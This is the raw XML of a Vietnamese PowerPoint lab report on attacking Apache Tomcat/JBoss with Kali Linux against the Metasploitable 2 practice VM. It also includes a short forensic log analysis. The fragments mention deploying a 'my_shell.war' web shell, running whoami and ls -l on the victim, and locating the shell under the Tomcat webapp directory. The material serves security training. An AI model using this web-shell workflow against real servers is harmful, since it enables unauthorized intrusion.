              <a:t> run:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	run </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p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my_shell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tomcat ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tử</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> run: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,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terminal </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> victim </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>giờ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ta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check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chắc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chắn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:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>whoami</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	ls -l</a:t>
            </a:r>
          </a:p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F8EDE-3E69-4215-9550-5208FF44F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606" y="739909"/>
            <a:ext cx="5001323" cy="447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823833-25D5-4C4C-BC39-3E00B4907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056" y="2348240"/>
            <a:ext cx="5149901" cy="434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09001F-CEE3-47D7-A28C-D573C52B0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156" y="2883488"/>
            <a:ext cx="6103703" cy="1028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A0605D-45F9-4BDC-BEA9-2BB02767B2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093" y="4478464"/>
            <a:ext cx="4151702" cy="217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F1DFF-891F-4C74-AAA1-4DDDE4564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151789"/>
            <a:ext cx="10954271" cy="79918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Phân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tích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pháp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 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499" y="1097281"/>
            <a:ext cx="11492179" cy="5457138"/>
          </a:xfrm>
        </p:spPr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log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metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2 ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thấy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> file shell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ở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:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	/var/lib/tomcat5.5/webapp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thấy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>my_shell.war</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US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D1527-8B83-44D7-B65F-F93EF6F54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208" y="1611919"/>
            <a:ext cx="3789274" cy="2111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69DBD6-856B-44C0-862E-A30579B62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545" y="4069540"/>
            <a:ext cx="4807491" cy="267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79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30" y="351130"/>
            <a:ext cx="11572646" cy="6232549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7C2D3-C28C-496F-BFB8-C30EFF3CC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311" y="274321"/>
            <a:ext cx="5992061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3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0B1167-970D-4857-8E4F-DF12B4030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119" y="329184"/>
            <a:ext cx="11440972" cy="6195973"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/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:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	anonyViet.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	Whitehat.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="132207882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535</TotalTime>
  <Words>866</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen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Century Gothic</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Wingdings 3</vt:lpstr>
      <vt:lpstr>Slice</vt:lpstr>
      <vt:lpstr>Báo cáo thực hành tấn công Apache tomcat/jboss với kali linux và metasploiable 2</vt:lpstr>
      <vt:lpstr>Giới thiệu lỗ hổng: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Phân tích pháp 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trung nguyen</dc:creator>
  <cp:lastModifiedBy>trung nguyen</cp:lastModifiedBy>
  <cp:revision>85</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-12-15T15:03:15Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-12-30T01:15:17Z</dcterms:modified>
</cp:coreProperties>
</file>